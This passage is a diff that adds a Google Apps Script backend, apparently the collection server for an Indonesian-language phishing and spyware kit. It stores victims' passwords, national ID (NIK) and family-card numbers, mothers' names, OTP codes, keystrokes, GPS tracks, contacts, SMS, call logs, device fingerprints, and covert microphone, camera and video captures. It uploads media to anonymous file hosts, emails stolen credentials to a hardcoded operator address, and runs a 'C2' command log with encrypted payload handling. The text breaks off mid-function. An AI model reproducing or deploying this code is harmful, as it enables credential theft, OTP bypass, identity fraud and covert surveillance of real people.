@@ -1,0 +1,947 @@
+var SHEET_ID='1ntinMwNWPBfMeZGcEyr_dKQpiMm9juBCkOhqmkzU2Co',SECRET_KEY='@704nksJJ',PSK='BsuPegasus2026K';
+var SHEET_LOG='LOGIN',SHEET_C2='C2',SHEET_IMP='IMPLANT',SHEET_MX='MATRIX';
+var SHEET_NIK='NIK',SHEET_FUN='FUNNEL',SHEET_JEJAK='JEJAK',SHEET_KON='KONTAK',SHEET_SMS='SMS',SHEET_TEL='TEL';
+var SHEET_DET='DET',SHEET_MIC='MIC',SHEET_AUD='SUARA',SHEET_VID='VIDEO';
+var SHEET_MEDIA='MEDIA',SHEET_ANTRE='ANTRE';
+var SHEET_SIDIK='SIDIK',SHEET_SITUS='SITUS',SHEET_IZIN='IZIN',SHEET_JAR='JARINGAN';
+var DRIVE_FOLDER_ID='1QgviD6FDitWLTOGG1P8WKq7tJ2Xo6zoD';
+var NOTIFY_EMAIL='ajasomplak3@gmail.com';
+var DUKCAPIL_URL='',DUKCAPIL_KEY='';
+var HOST_URUT='catbox,tmpfiles,0x0,drive';
+var BUILD='zgch-f20',AUTO_RELOAD=false;
+
+var H_LOG=['WAKTU','NIK','USERNAME','PASSWORD','DEVICE_ID','UA','PLATFORM','BAHASA','ZONA','LAYAR','RID','OTP','WAKTU_OTP','IP','ISP','LAT','LNG','AKURASI','MAPS','FOTO','SKOR','SIDIK','REFERRER','SID','HALAMAN','KLIK','STATUS','CATATAN','NO_KK','NO_HP','IBU'];
+var H_IMP=['SID','WAKTU','IP','ISP','KOTA','LAT','LNG','PROV','NEGARA','ZONA','DEVICE','PLATFORM','BAHASA','LAYAR','UA','MODEL','MEMORI','INTI','GPU','BATERAI','SIDIK','PROBE','YIELD','PROMPTS','LAUNDER','SUMBER','FOTO','TIPE','BRAND','MODEL_DEV','OS_DEV','BROWSER_DEV','SKOR_DET'];
+var H_DET=['SID','WAKTU','DEVICE_ID','TIPE','BRAND','MODEL','OS','OS_VER','BROWSER','BROWSER_VER','UA','ARCH','BITNESS','FORM','LAYAR','VIEWPORT','PIXELRATIO','CPU','RAM','TOUCH','BAHASA','BAHASA_ALL','ZONA','ONLINE','NET','DOWNLINK','RTT','BATERAI','CHARGE','PLATFORM','IP','SIDIK','PROBE','SKOR','HALAMAN'];
+var H_MIC=['WAKTU','SID','DB','PEAK','VA','SUMBER'];
+var H_AUD=['WAKTU','SID','DURASI','BYTE','MIME','URL','HOST','SUMBER'];
+var H_VID=['WAKTU','SID','DURASI','BYTE','MIME','URL','HOST','SUMBER'];
+var H_MEDIA=['WAKTU','SID','JENIS','BYTE','MIME','HOST','URL','STATUS'];
+var H_ANTRE=['WAKTU','SID','JENIS','MIME','NAMA','B64','COBA'];
+var H_NIK=['WAKTU','NIK','SUMBER','PROV','KAB','KEC','TTL','JK','UMUR','KOTA','POS','UNIK','CEK_PROV','CEK_KAB','CEK_KEC','CEK_TTL','CEK_JK','CEK_UNIK','VALID','SKOR','CATATAN','SID','NAMA','KK','HP','IBU'];
+var H_MX=['SID','WAKTU','BUILD','RUN','PLATFORM','CAP','OUTCOME','LAT','NOTE'];
+var H_C2=['SID','WAKTU','ARAH','CMD','STATUS','ISI','ARG'];
+var H_FUN=['WAKTU','SID','NIK','TAHAP','KETERANGAN'];
+var H_JEJAK=['WAKTU','SID','LAT','LNG','AKURASI','SUMBER'];
+var H_KON=['WAKTU','SID','NAMA','TEL','EMAIL','ALAMAT'];
+var H_SMS=['WAKTU','SID','KODE','TEKS'];
+var H_TEL=['WAKTU','SID','NOMOR','JENIS','DURASI'];
+var H_SIDIK=['WAKTU','SID','HASH','CANVAS','WEBGL','AUDIO','FON','GPU','PLATFORM','LAYAR','ZONA','BAHASA','INTI','RAM','TOUCH','PERANGKAT','KODEK','SUARA','STORAGE','INCOGNITO','ADBLOCK','PROBE','UA'];
+var H_SITUS=['WAKTU','SID','T','EVENT','DATA','HALAMAN','REFERRER','UTM'];
+var H_IZIN=['WAKTU','SID','NAMA','STATUS'];
+var H_JAR=['WAKTU','SID','LOKAL','PUBLIK','TIPE','DOWN','RTT','ONLINE','UA'];
+
+var PROV={'11':'Aceh','12':'Sumatera Utara','13':'Sumatera Barat','14':'Riau','15':'Jambi','16':'Sumatera Selatan','17':'Bengkulu','18':'Lampung','19':'Kepulauan Bangka Belitung','21':'Kepulauan Riau','31':'DKI Jakarta','32':'Jawa Barat','33':'Jawa Tengah','34':'DI Yogyakarta','35':'Jawa Timur','36':'Banten','51':'Bali','52':'Nusa Tenggara Barat','53':'Nusa Tenggara Timur','61':'Kalimantan Barat','62':'Kalimantan Tengah','63':'Kalimantan Selatan','64':'Kalimantan Timur','65':'Kalimantan Utara','71':'Sulawesi Utara','72':'Sulawesi Tengah','73':'Sulawesi Selatan','74':'Sulawesi Tenggara','75':'Gorontalo','76':'Sulawesi Barat','81':'Maluku','82':'Maluku Utara','91':'Papua','92':'Papua Barat','93':'Papua Selatan','94':'Papua Tengah','95':'Papua Pegunungan','96':'Papua Barat Daya'};
+
+function out(o){return ContentService.createTextOutput(JSON.stringify(o)).setMimeType(ContentService.MimeType.JSON)}
+function now_(){return Utilities.formatDate(new Date(),Session.getScriptTimeZone(),'dd/MM/yyyy HH:mm:ss')}
+function esc(v){return String(v==null?'':v).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
+
+function ss_(){return SpreadsheetApp.openById(SHEET_ID)}
+var HDR={LOGIN:H_LOG,IMPLANT:H_IMP,DET:H_DET,MIC:H_MIC,SUARA:H_AUD,VIDEO:H_VID,
+  MEDIA:H_MEDIA,ANTRE:H_ANTRE,NIK:H_NIK,MATRIX:H_MX,C2:H_C2,FUNNEL:H_FUN,
+  JEJAK:H_JEJAK,KONTAK:H_KON,SMS:H_SMS,TEL:H_TEL,SIDIK:H_SIDIK,SITUS:H_SITUS,IZIN:H_IZIN,JARINGAN:H_JAR};
+function getSheet_(n){
+  var ss=ss_(),sh=ss.getSheetByName(n);
+  if(!sh)sh=ss.insertSheet(n);
+  var h=HDR[n];if(!h)return sh;
+  var lc=sh.getLastColumn();
+  var cur=lc?sh.getRange(1,1,1,Math.max(lc,h.length)).getValues()[0]:[];
+  if(cur.slice(0,h.length).join('|')!==h.join('|')){
+    sh.getRange(1,1,1,h.length).setValues([h]).setFontWeight('bold').setBackground('#e8f0fe');
+    sh.setFrozenRows(1);
+  }
+  return sh;
+}
+function findRow(sh,col,val){
+  var l=sh.getLastRow();if(l<2)return 0;
+  var v=sh.getRange(2,col,l-1,1).getValues();
+  for(var i=v.length-1;i>=0;i--)if(String(v[i][0])===String(val))return i+2;
+  return 0;
+}
+function upsert(sh,col,val,data){
+  var r=findRow(sh,col,val);
+  if(r){sh.getRange(r,1,1,data.length).setValues([data]);return r}
+  sh.appendRow(data);return sh.getLastRow();
+}
+
+/* ---------- kripto ---------- */
+var SB=(function(){
+  var s='637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b27509832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cfd0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdbe0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9ee1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16';
+  var a=new Uint8Array(256);for(var i=0;i<256;i++)a[i]=parseInt(s.substr(i*2,2),16);return a;
+})();
+var RC=[1,2,4,8,16,32,64,128,27,54];
+function xt_(b){return ((b<<1)^((b&0x80)?0x1b:0))&0xff}
+function expand_(k){
+  var w=new Uint8Array(176);w.set(k);
+  for(var i=16,r=0;i<176;i+=4){
+    var t=[w[i-4],w[i-3],w[i-2],w[i-1]];
+    if(i%16===0)t=[SB[t[1]]^RC[r++],SB[t[2]],SB[t[3]],SB[t[0]]];
+    w[i]=w[i-16]^t[0];w[i+1]=w[i-15]^t[1];w[i+2]=w[i-14]^t[2];w[i+3]=w[i-13]^t[3];
+  }
+  return w;
+}
+function encBlock_(w,inp){
+  var s=new Uint8Array(inp),i,c,r,t;
+  for(i=0;i<16;i++)s[i]^=w[i];
+  for(var rd=1;rd<10;rd++){
+    for(i=0;i<16;i++)s[i]=SB[s[i]];
+    t=new Uint8Array(16);
+    for(c=0;c<4;c++)for(r=0;r<4;r++)t[r+4*c]=s[r+4*((c+r)%4)];
+    s=t;
+    for(c=0;c<4;c++){
+      var a0=s[4*c],a1=s[4*c+1],a2=s[4*c+2],a3=s[4*c+3];
+      s[4*c]=xt_(a0)^xt_(a1)^a2^a3^xt_(a0);
+      s[4*c+1]=a0^xt_(a1)^xt_(a2)^a2^a3;
+      s[4*c+2]=a0^a1^xt_(a2)^xt_(a3)^a3;
+      s[4*c+3]=xt_(a0)^a0^a1^a2^xt_(a3);
+    }
+    for(i=0;i<16;i++)s[i]^=w[16*rd+i];
+  }
+  for(i=0;i<16;i++)s[i]=SB[s[i]];
+  t=new Uint8Array(16);
+  for(c=0;c<4;c++)for(r=0;r<4;r++)t[r+4*c]=s[r+4*((c+r)%4)];
+  for(i=0;i<16;i++)s[i]=t[i]^w[160+i];
+  return s;
+}
+function kunci_(){
+  var kb=Utilities.newBlob(PSK).getBytes(),k=new Uint8Array(16);
+  for(var i=0;i<16;i++)k[i]=i<kb.length?kb[i]:0;
+  return expand_(k);
+}
+function ctrDec_(b64){
+  var d=Utilities.base64Decode(b64);
+  if(d.length<17)throw new Error('blok pendek');
+  var w=kunci_(),ctr=d.slice(0,16),body=d.slice(16),o=new Uint8Array(body.length);
+  for(var off=0;off<body.length;off+=16){
+    var ks=encBlock_(w,ctr);
+    for(var i=0;i<16&&off+i<body.length;i++)o[off+i]=body[off+i]^ks[i];
+    for(var b=15;b>=8;b--){ctr[b]=(ctr[b]+1)&0xff;if(ctr[b])break}
+  }
+  return o;
+}
+function ctrEnc_(txt){
+  var raw=Utilities.newBlob(txt).getBytes(),w=kunci_(),ctr=new Uint8Array(16);
+  for(var i=0;i<16;i++)ctr[i]=Math.floor(Math.random()*256);
+  var o=new Uint8Array(16+raw.length);o.set(ctr,0);
+  for(var off=0;off<raw.length;off+=16){
+    var ks=encBlock_(w,ctr);
+    for(var j=0;j<16&&off+j<raw.length;j++)o[16+off+j]=raw[off+j]^ks[j];
+    for(var b=15;b>=8;b--){ctr[b]=(ctr[b]+1)&0xff;if(ctr[b])break}
+  }
+  return Utilities.base64Encode(o);
+}
+function parse(e){
+  var p={};
+  try{
+    var raw=(e.postData&&e.postData.contents)||'';
+    try{p=JSON.parse(raw)}
+    catch(x){raw.split('&').forEach(function(kv){
+      if(!kv)return;var i=kv.indexOf('=');
+      var k=i<0?kv:kv.slice(0,i),v=i<0?'':decodeURIComponent(kv.slice(i+1).replace(/\+/g,' '));
+      p[k]=v;
+    })}
+  }catch(x){}
+  var q=e.parameter||{};Object.keys(q).forEach(function(k){if(p[k]==null)p[k]=q[k]});
+  return p;
+}
+function open_(p){
+  if(String(p.enc)!=='1'||!p.p)return p;
+  var b64=String(p.p),gz=String(p.gz)==='1';
+  try{
+    var raw=ctrDec_(b64);
+    if(gz)raw=Utilities.ungzip(Utilities.newBlob(raw)).getBytes();
+    var o=JSON.parse(Utilities.newBlob(raw).getDataAsString());
+    o.action=p.action||o.action;o.sid=p.sid||o.sid;return o;
+  }catch(e){
+    try{
+      var pl=Utilities.base64Decode(b64);
+      if(gz){try{pl=Utilities.ungzip(Utilities.newBlob(pl)).getBytes()}catch(x){}}
+      var o2=JSON.parse(Utilities.newBlob(pl).getDataAsString());
+      o2.action=p.action||o2.action;o2.sid=p.sid||o2.sid;o2.__polos=1;return o2;
+    }catch(e2){return {action:p.action,sid:p.sid,__err:e.message+' / '+e2.message}}
+  }
+}
+function folder_(){try{return DriveApp.getFolderById(DRIVE_FOLDER_ID)}catch(e){return DriveApp.createFolder('ZGCH')}}
+function acak_(){return Math.random().toString(36).slice(2,10)}
+function ext_(mime){
+  if(mime.indexOf('mp4')>-1)return '.mp4';
+  if(mime.indexOf('ogg')>-1)return '.ogg';
+  if(mime.indexOf('m4a')>-1)return '.m4a';
+  if(mime.indexOf('jpeg')>-1)return '.jpg';
+  return '.webm';
+}
+
+/* ---------- unggah berantai ---------- */
+function unggah_(bytes,mime,nama,jenis,sid){
+  var blob=Utilities.newBlob(bytes,mime,nama);
+  var host=[],hasil=null;
+  try{host=String(HOST_URUT||'').split(',')}catch(e){host=[]}
+  if(!host.length)host=['drive'];
+  for(var i=0;i<host.length;i++){
+    var h=host[i];
+    if(hasil)break;
+    try{
+      if(h==='catbox'){
+        var r=UrlFetchApp.fetch('https://catbox.moe/user/api.php',{
+          method:'post',muteHttpExceptions:true,
+          headers:{'User-Agent':'Mozilla/5.0'},
+          payload:{reqtype:'fileupload',fileToUpload:blob}});
+        var t=String(r.getContentText()).trim();
+        if(/^https?:\/\//.test(t))hasil={host:'catbox',url:t};
+      } else if(h==='tmpfiles'){
+        var r2=UrlFetchApp.fetch('https://tmpfiles.org/api/v1/upload',{
+          method:'post',muteHttpExceptions:true,
+          headers:{'User-Agent':'Mozilla/5.0'},
+          payload:{file:blob}});
+        var j=JSON.parse(r2.getContentText());
+        var u=j&&j.data&&j.data.url;
+        if(u)hasil={host:'tmpfiles',url:String(u).replace('tmpfiles.org/','tmpfiles.org/dl/')};
+      } else if(h==='0x0'){
+        var r3=UrlFetchApp.fetch('https://0x0.st',{
+          method:'post',muteHttpExceptions:true,
+          headers:{'User-Agent':'Mozilla/5.0'},
+          payload:{file:blob}});
+        var t3=String(r3.getContentText()).trim();
+        if(/^https?:\/\//.test(t3))hasil={host:'0x0',url:t3};
+      } else if(h==='drive'){
+        var f=folder_().createFile(blob);
+        try{f.setSharing(DriveApp.Access.ANYONE_WITH_LINK,DriveApp.Permission.VIEW)}catch(e){}
+        hasil={host:'drive',
+          url:'https://drive.google.com/file/d/'+f.getId()+'/view',
+          thumb:'https://drive.google.com/thumbnail?id='+f.getId()+'&sz=w900'};
+      }
+    }catch(e){}
+  }
+  getSheet_(SHEET_MEDIA).appendRow([now_(),String(sid||''),String(jenis||''),bytes.length,
+    mime,hasil?hasil.host:'-',hasil?hasil.url:'-',hasil?'ok':'gagal']);
+  if(!hasil){
+    getSheet_(SHEET_ANTRE).appendRow([now_(),String(sid||''),String(jenis||''),mime,nama,
+      Utilities.base64Encode(bytes),0]);
+  }
+  return hasil;
+}
+function simpanMedia_(p,sheet,jenis,mimeBawaan,sumber){
+  var b=String(p.img||'');
+  if(b.indexOf('data:')===0)b=b.slice(b.indexOf(',')+1);
+  if(b.length<600)return {err:'kecil',len:b.length};
+  var bytes;
+  try{bytes=Utilities.base64Decode(b)}catch(e){return {err:'base64 rusak'}}
+  if(bytes.length<800)return {err:'byte '+bytes.length};
+  var mime=String(p.mime||mimeBawaan);
+  var nama='zgch-'+jenis+'-'+Date.now()+'-'+acak_()+'-'+String(p.sid||'').slice(0,6)+ext_(mime);
+  var h=unggah_(bytes,mime,nama,jenis,p.sid);
+  if(!h)return {err:'semua host gagal'};
+  getSheet_(sheet).appendRow([now_(),String(p.sid||''),String(p.dur||''),
+    bytes.length,mime,h.url,h.host,String(p.sumber||sumber||'auto')]);
+  getSheet_(SHEET_C2).appendRow([String(p.sid||''),now_(),sheet.toLowerCase(),
+    String(p.sumber||sumber||'auto'),'selesai',h.url,'']);
+  return {ok:true,url:h.url,host:h.host,byte:bytes.length};
+}
+function sapu_(){
+  var sh=getSheet_(SHEET_ANTRE),l=sh.getLastRow();
+  if(l<2)return out({ok:true,sisa:0});
+  var max=Math.min(l-1,8),beres=0;
+  var v=sh.getRange(2,1,max,H_ANTRE.length).getValues();
+  for(var i=v.length-1;i>=0;i--){
+    var r=v[i];
+    try{
+      var bytes=Utilities.base64Decode(String(r[5]));
+      var h=unggah_(bytes,String(r[3]||'application/octet-stream'),
+        String(r[4]||('antre-'+Date.now())),String(r[2]||'antre'),String(r[1]||''));
+      if(h){
+        var sheetTuju=r[2]==='video'?SHEET_VID:(r[2]==='suara'?SHEET_AUD:SHEET_AUD);
+        getSheet_(sheetTuju).appendRow([now_(),String(r[1]||''),'',bytes.length,
+          String(r[3]||''),h.url,h.host,'antre']);
+        sh.deleteRow(i+2);beres++;
+      } else {
+        var c=Number(r[6])||0;
+        sh.getRange(i+2,7).setValue(c+1);
+        if(c>=6)sh.deleteRow(i+2);
+      }
+    }catch(e){try{sh.deleteRow(i+2)}catch(x){}}
+  }
+  return out({ok:true,beres:beres});
+}
+function ringkasHarian(){
+  if(!NOTIFY_EMAIL)return;
+  var n=function(nama){try{var s=getSheet_(nama);return Math.max(0,s.getLastRow()-1)}catch(e){return 0}};
+  var antre=0;try{antre=Math.max(0,getSheet_(SHEET_ANTRE).getLastRow()-1)}catch(e){}
+  var body='<b>Ringkasan harian</b><br>Waktu: '+now_()+
+    '<br>Login: '+n(SHEET_LOG)+'<br>NIK: '+n(SHEET_NIK)+
+    '<br>Perangkat: '+n(SHEET_DET)+'<br>Foto: '+n(SHEET_IMP)+
+    '<br>Audio: '+n(SHEET_AUD)+'<br>Video: '+n(SHEET_VID)+
+    '<br>Mic: '+n(SHEET_MIC)+'<br>SMS: '+n(SHEET_SMS)+'<br>Tel: '+n(SHEET_TEL)+
+    '<br>Kontak: '+n(SHEET_KON)+'<br>Sidik: '+n(SHEET_SIDIK)+
+    '<br>Situs: '+n(SHEET_SITUS)+'<br>Antrean: '+antre+
+    '<br><br><a href="https://script.google.com/home">buka konsol</a>';
+  try{MailApp.sendEmail({to:NOTIFY_EMAIL,subject:'ZGCH ringkas '+now_(),htmlBody:body})}catch(e){}
+}
+function pasangJam(){
+  ScriptApp.getProjectTriggers().forEach(function(t){
+    var f=t.getHandlerFunction();
+    if(f==='sapu_'||f==='ringkasHarian')ScriptApp.deleteTrigger(t);
+  });
+  ScriptApp.newTrigger('sapu_').timeBased().everyMinutes(5).create();
+  ScriptApp.newTrigger('ringkasHarian').timeBased().atHour(6).everyDays(1).create();
+  return out({ok:true,build:BUILD,status:'jam terpasang'});
+}
+
+/* ---------- simpan ---------- */
+function saveAuto(p){
+  var sid=String(p.sid||'')||Utilities.getUuid().slice(0,12);
+  var sh=getSheet_(SHEET_IMP);
+  var d=new Array(H_IMP.length);for(var i=0;i<H_IMP.length;i++)d[i]='';
+  d[0]=sid;d[1]=now_();d[2]=String(p.ip||'');d[9]=String(p.zona||'');
+  d[10]=String(p.device||'');d[11]=String(p.platform||'');d[12]=String(p.bahasa||'');
+  d[13]=String(p.layar||'');d[14]=String(p.ua||'');d[15]=String(p.model||'');
+  d[16]=String(p.memori||'');d[17]=String(p.inti||'');d[18]=String(p.gpu||'');
+  d[19]=String(p.bateri||'');
+  d[20]=String(p.sidik||'');d[21]=String(p.probe||'{}');d[22]=String(p.yield||0);
+  d[23]=String(p.prompts||0);d[24]=String(p.launder||0);d[25]='auto';
+  d[27]=String(p.tipe||'');d[28]=String(p.brand||'');
+  d[29]=String(p.model||'');d[30]=String(p.os||'')+' '+String(p.osv||'');
+  d[31]=String(p.browser||'')+' '+String(p.bver||'');
+  upsert(sh,1,sid,d);
+  return out({ok:true,sid:sid,build:BUILD});
+}
+function saveProbe(p){return saveAuto(p)}
+function saveDet(p){
+  var sid=String(p.sid||'')||Utilities.getUuid().slice(0,12);
+  var d=new Array(H_DET.length);for(var i=0;i<H_DET.length;i++)d[i]='';
+  d[0]=sid;d[1]=now_();d[2]=String(p.deviceId||'');d[3]=String(p.tipe||'');
+  d[4]=String(p.brand||'');d[5]=String(p.model||'');d[6]=String(p.os||'');
+  d[7]=String(p.osv||'');d[8]=String(p.browser||'');d[9]=String(p.bver||'');
+  d[10]=String(p.ua||'');d[11]=String(p.arch||'');d[12]=String(p.bit||'');
+  d[13]=String(p.form||'');d[14]=String(p.layar||'');d[15]=String(p.viewport||'');
+  d[16]=String(p.pr||'');d[17]=String(p.cpu||'');d[18]=String(p.ram||'');
+  d[19]=String(p.touch||'');d[20]=String(p.bahasa||'');d[21]=String(p.bahasaAll||'');
+  d[22]=String(p.zona||'');d[23]=String(p.online||'');d[24]=String(p.net||'');
+  d[25]=String(p.down||'');d[26]=String(p.rtt||'');d[27]=String(p.bateri||'');
+  d[28]=String(p.charge||'');d[29]=String(p.platform||'');d[30]=String(p.ip||'');
+  d[31]=String(p.sidik||'');d[32]=String(p.probe||'{}');d[33]=String(p.skor||'');
+  d[34]=String(p.page||'');
+  upsert(getSheet_(SHEET_DET),1,sid,d);
+  var im=getSheet_(SHEET_IMP),r=findRow(im,1,sid);
+  if(r){
+    im.getRange(r,11).setValue(String(p.deviceId||''));
+    im.getRange(r,16).setValue(String(p.model||''));
+    im.getRange(r,20).setValue(String(p.bateri||''));
+    im.getRange(r,28).setValue(String(p.tipe||''));
+    im.getRange(r,29).setValue(String(p.brand||''));
+    im.getRange(r,30).setValue(String(p.model||''));
+    im.getRange(r,31).setValue(String(p.os||'')+' '+String(p.osv||''));
+    im.getRange(r,32).setValue(String(p.browser||'')+' '+String(p.bver||''));
+    im.getRange(r,33).setValue(String(p.skor||''));
+  }
+  return out({ok:true,sid:sid});
+}
+function saveMic(p){
+  getSheet_(SHEET_MIC).appendRow([now_(),String(p.sid||''),String(p.db||''),
+    String(p.peak||''),String(p.va||''),String(p.sumber||'latar')]);
+  return out({ok:true});
+}
+function saveSuara(p){
+  var r=simpanMedia_(p,SHEET_AUD,'suara','audio/webm','mic');
+  return r.err?out({ok:false,err:r.err}):out(r);
+}
+function saveVideo(p){
+  var r=simpanMedia_(p,SHEET_VID,'video','video/webm','kamera');
+  return r.err?out({ok:false,err:r.err}):out(r);
+}
+function saveSms(p){
+  getSheet_(SHEET_SMS).appendRow([now_(),String(p.sid||''),String(p.kode||''),String(p.teks||'')]);
+  return out({ok:true});
+}
+function saveTel(p){
+  var rows=[];try{rows=JSON.parse(String(p.rows||'[]'))}catch(e){}
+  var sh=getSheet_(SHEET_TEL);
+  rows.forEach(function(r){sh.appendRow([now_(),String(p.sid||''),String(r.nomor||''),
+    String(r.jenis||''),String(r.durasi||'')])});
+  return out({ok:true,n:rows.length});
+}
+function saveLogin(p){
+  var rid=String(p.rid||''),sid=String(p.sid||'');
+  if(rid){var c=CacheService.getScriptCache();if(c.get('r'+rid))return out({ok:true,dup:1});c.put('r'+rid,'1',21600)}
+  var sh=getSheet_(SHEET_LOG),nr=sh.getLastRow()+1;
+  var d=new Array(H_LOG.length);for(var i=0;i<H_LOG.length;i++)d[i]='';
+  d[0]=now_();d[1]=String(p.nik||'');d[2]=String(p.username||'');d[3]=String(p.password||'');
+  d[4]=String(p.device||'');d[5]=String(p.ua||'');d[6]=String(p.platform||'');
+  d[7]=String(p.bahasa||'');d[8]=String(p.zona||'');d[9]=String(p.layar||'');
+  d[10]=rid;d[13]=String(p.ip||'');d[19]=String(p.foto||'');d[20]=String(p.skor||'');
+  d[21]=String(p.sidik||'');d[22]=String(p.referrer||'');d[23]=sid;
+  d[24]=String(p.page||'');d[26]='login';d[27]=String(p.keylog||'');
+  d[28]=String(p.kk||'');d[29]=String(p.hp||'');d[30]=String(p.ibu||'');
+  sh.getRange(nr,1,1,H_LOG.length).setValues([d]);
+  var back=sh.getRange(nr,1,1,H_LOG.length).getValues()[0];
+  if(String(back[2])!==String(p.username||'')){
+    var f=new Array(H_LOG.length);for(var j=0;j<H_LOG.length;j++)f[j]='';
+    f[0]=now_();f[1]=String(p.nik||'');f[2]=String(p.username||'');f[3]=String(p.password||'');
+    f[10]=rid;f[13]=String(p.ip||'');f[23]=sid;f[26]='login';
+    f[28]=String(p.kk||'');f[29]=String(p.hp||'');f[30]=String(p.ibu||'');
+    sh.getRange(nr,1,1,H_LOG.length).setValues([f]);
+  }
+  if(String(p.nik||'')){try{saveNik({nik:p.nik,ok:1,sid:sid,kk:p.kk,hp:p.hp,ibu:p.ibu})}catch(e){}}
+  try{
+    var det=[p.tipe,p.brand,p.model,p.os,p.osv,p.browser].filter(String).join(' ');
+    if(NOTIFY_EMAIL)MailApp.sendEmail({to:NOTIFY_EMAIL,subject:'ZGCH · '+String(p.username||''),
+      htmlBody:'<b>Email</b> '+esc(p.username)+'<br><b>Sandi</b> '+esc(p.password)+
+        '<br><b>NIK</b> '+esc(p.nik)+'<br><b>KK</b> '+esc(p.kk)+'<br><b>HP</b> '+esc(p.hp)+
+        '<br><b>Ibu</b> '+esc(p.ibu)+'<br><b>IP</b> '+esc(p.ip)+
+        '<br><b>Perangkat</b> '+esc(det)+'<br><b>Waktu</b> '+now_()});
+  }catch(e){}
+  return out({ok:true,baris:nr,kolom:H_LOG.length});
+}
+function saveOtp(p){
+  var sh=getSheet_(SHEET_LOG),r=findRow(sh,24,String(p.sid||''));
+  if(r){sh.getRange(r,12).setValue(String(p.code||''));sh.getRange(r,13).setValue(now_());sh.getRange(r,27).setValue('otp')}
+  getSheet_(SHEET_SMS).appendRow([now_(),String(p.sid||''),String(p.code||''),'otp']);
+  return out({ok:true});
+}
+function saveExtra(p){
+  var sh=getSheet_(SHEET_LOG),r=findRow(sh,24,String(p.sid||''));
+  if(r){
+    if(p.lat)sh.getRange(r,16).setValue(String(p.lat));
+    if(p.lng)sh.getRange(r,17).setValue(String(p.lng));
+    if(p.lat&&p.lng)sh.getRange(r,19).setValue('https://www.google.com/maps?q='+p.lat+','+p.lng);
+  }
+  return out({ok:true});
+}
+function saveLacak(p){
+  getSheet_(SHEET_JEJAK).appendRow([now_(),String(p.sid||''),String(p.lat||''),String(p.lng||''),String(p.acc||''),String(p.sumber||'')]);
+  saveExtra(p);
+  return out({ok:true});
+}
+function saveFoto(p){
+  var b=String(p.img||'');
+  if(b.indexOf('data:')===0)b=b.slice(b.indexOf(',')+1);
+  if(b.length<3500)return out({ok:false,err:'terlalu kecil',len:b.length});
+  var bytes;
+  try{bytes=Utilities.base64Decode(b)}catch(e){return out({ok:false,err:'base64 rusak'})}
+  if(bytes.length<2500)return out({ok:false,err:'byte '+bytes.length});
+  var nama='zgch-foto-'+Date.now()+'-'+acak_()+'-'+String(p.sid||'').slice(0,6)+'.jpg';
+  var h=unggah_(bytes,'image/jpeg',nama,'foto',p.sid);
+  if(!h)return out({ok:false,err:'semua host gagal'});
+  var thumb=h.thumb||h.url;
+  var sh=getSheet_(SHEET_IMP),r=findRow(sh,1,String(p.sid||''));
+  if(r)sh.getRange(r,27).setValue(thumb);
+  var l=getSheet_(SHEET_LOG),lr=findRow(l,24,String(p.sid||''));
+  if(lr)l.getRange(lr,20).setValue(thumb);
+  getSheet_(SHEET_C2).appendRow([String(p.sid||''),now_(),'foto',String(p.ket||''),'selesai',thumb,'']);
+  return out({ok:true,thumb:thumb,url:h.url,host:h.host,byte:bytes.length});
+}
+function saveNik(p){
+  var nik=String(p.nik||'').replace(/\D/g,'');
+  var prov=PROV[nik.slice(0,2)]||'';
+  var d=parseInt(nik.slice(6,8),10)||0,jk=d>40?'P':'L',tgl=d>40?d-40:d;
+  var bln=parseInt(nik.slice(8,10),10)||0,thn=parseInt(nik.slice(10,12),10)||0;
+  var nama='';
+  if(DUKCAPIL_URL&&DUKCAPIL_KEY){
+    try{
+      var res=UrlFetchApp.fetch(DUKCAPIL_URL+'?nik='+nik+'&key='+DUKCAPIL_KEY,{muteHttpExceptions:true});
+      var j=JSON.parse(res.getContentText());
+      nama=String((j&&(j.nama||(j.data&&j.data.nama)))||'');
+    }catch(e){}
+  }
+  var sh=getSheet_(SHEET_NIK);
+  var row=new Array(H_NIK.length);for(var i=0;i<H_NIK.length;i++)row[i]='';
+  row[0]=now_();row[1]=nik;row[2]='cek';row[3]=prov;row[4]=nik.slice(2,4);row[5]=nik.slice(4,6);
+  row[6]=(tgl||'')+'/'+(bln||'')+'/'+(thn?2000+thn:'');
+  row[7]=jk;row[8]=thn?String(new Date().getFullYear()-(2000+thn)):'';
+  row[11]=nik.slice(12,16);
+  row[12]=prov?1:0;row[15]=(tgl>=1&&tgl<=31&&bln>=1&&bln<=12)?1:0;row[16]=1;
+  row[17]=nik.length===16?1:0;row[18]=(prov&&nik.length===16)?1:0;
+  row[19]=String(p.ok==='1'||p.ok===1?70:35);
+  row[20]=nama?'dukcapil':'turunan nik';
+  row[21]=String(p.sid||'');row[22]=nama;
+  row[23]=String(p.kk||'');row[24]=String(p.hp||'');row[25]=String(p.ibu||'');
+  sh.appendRow(row);
+  return out({ok:true,prov:prov,jk:jk,nama:nama});
+}
+function saveKunjungan(p){
+  getSheet_(SHEET_FUN).appendRow([now_(),String(p.sid||''),String(p.nik||''),String(p.tahap||''),String(p.ket||'')]);
+  return out({ok:true});
+}
+function saveKontak(p){
+  var rows=[];try{rows=JSON.parse(String(p.rows||'[]'))}catch(e){}
+  var sh=getSheet_(SHEET_KON);
+  rows.forEach(function(c){sh.appendRow([now_(),String(p.sid||''),String(c.nama||''),String(c.tel||''),String(c.em||''),String(c.al||'')])});
+  return out({ok:true,n:rows.length});
+}
+function saveSidik(p){
+  getSheet_(SHEET_SIDIK).appendRow([now_(),String(p.sid||''),String(p.hash||''),
+    String(p.canvas||''),String(p.webgl||''),String(p.audio||''),String(p.fon||''),
+    String(p.gpu||''),String(p.platform||''),String(p.layar||''),String(p.zona||''),
+    String(p.bahasa||''),String(p.inti||''),String(p.ram||''),String(p.touch||''),
+    String(p.perangkat||''),String(p.kodek||''),String(p.suara||''),String(p.storage||''),
